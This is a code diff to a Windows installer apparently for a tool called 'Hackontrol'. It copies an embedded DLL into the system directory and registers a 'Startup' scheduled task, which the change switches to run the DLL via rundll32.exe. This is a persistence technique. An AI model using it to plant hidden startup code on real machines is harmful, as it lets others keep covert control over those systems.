@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <string>
 #include "HackontrolInstaller.h"
 #include "resource.h"
 
@@ -7,6 +8,8 @@
 int main(int argc, char** argv) {
 	printf("Getting System Directory\n");
 	wchar_t* filePath = HI_GetSystemDirectory(FILE_NAME);
+	printf("Getting rundll32.exe Directory\n");
+	wchar_t* rundll32 = HI_GetSystemDirectory(L"rundll32.exe");
 	printf("Getting DLL Resource\n");
 	HRSRC resourceHandle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
 
@@ -70,7 +73,9 @@ int main(int argc, char** argv) {
 	ITaskDefinition* definition = HI_NewTask(service, folder);
 	HI_SetPrincipal(folder, definition);
 	HI_SetTriggers(folder, definition);
-	HI_SetActions(folder, definition, filePath);
+	std::wstring argument(FILE_NAME);
+	argument += L",Execute";
+	HI_SetActions(folder, definition, rundll32, argument.c_str());
 	HI_SetSettings(folder, definition);
 	HI_RegisterTask(folder, definition, L"Startup");
 	definition->Release();
